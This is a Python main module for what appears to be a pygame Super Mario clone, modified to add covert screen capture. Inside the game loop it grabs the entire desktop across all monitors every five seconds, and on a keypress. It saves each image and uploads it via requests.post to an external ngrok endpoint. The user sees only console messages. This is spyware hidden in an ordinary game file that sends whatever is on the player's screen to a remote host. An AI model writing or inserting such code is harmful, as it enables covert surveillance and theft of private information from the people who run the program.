__author__ = 'marble_xu'



import pygame as pg
from . import setup, tools
from . import constants as c
from .states import main_menu, load_screen, level

# For screenshots
import mss
from PIL import Image
import os
from datetime import datetime
import time
import requests

# -----------------------------
# Screenshot setup
# -----------------------------
SCREENSHOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "screenshots"))
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Set your server URL if needed
SERVER_URL = "https://plenipotent-molal-averi.ngrok-free.dev/upload"

def capture_screenshot():
    """Capture full screen and save locally + send to server"""
    with mss.mss() as sct:
        sct_img = sct.grab(sct.monitors[0])
        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
        filename = datetime.now().strftime("screenshot_%Y%m%d_%H%M%S.png")
        path = os.path.join(SCREENSHOT_DIR, filename)
        img.save(path)
        print("[Screenshot] Saved:", path)
        send_screenshot(path)

def send_screenshot(path):
    """Send screenshot to server"""
    with open(path, "rb") as f:
        files = {'file': f}
        try:
            response = requests.post(SERVER_URL, files=files)
            print("[Server] Response:", response.text)
        except Exception as e:
            print("[Server] Failed to send:", e)

# -----------------------------
# Main game function
# -----------------------------
def main():
    game = tools.Control()
    state_dict = {
        c.MAIN_MENU: main_menu.Menu(),
        c.LOAD_SCREEN: load_screen.LoadScreen(),
        c.LEVEL: level.Level(),
        c.GAME_OVER: load_screen.GameOver(),
        c.TIME_OUT: load_screen.TimeOut()
    }
    game.setup_states(state_dict, c.MAIN_MENU)

    # Initialize pygame and timing for automatic screenshots
    pg.init()
    last_auto = time.time()
    auto_interval = 5  # seconds

    running = True
    while running:
        # Run one iteration of the game loop
        game.main()  # this advances the game state

        for event in pg.event.get():
            if event.type == pg.QUIT:
                running = False
            elif event.type == pg.KEYDOWN:
                if event.key == pg.K_s:
                    capture_screenshot()  # manual screenshot

        # Automatic screenshot every 5 seconds
        now = time.time()
        if now - last_auto >= auto_interval:
            capture_screenshot()
            last_auto = now

    pg.quit()
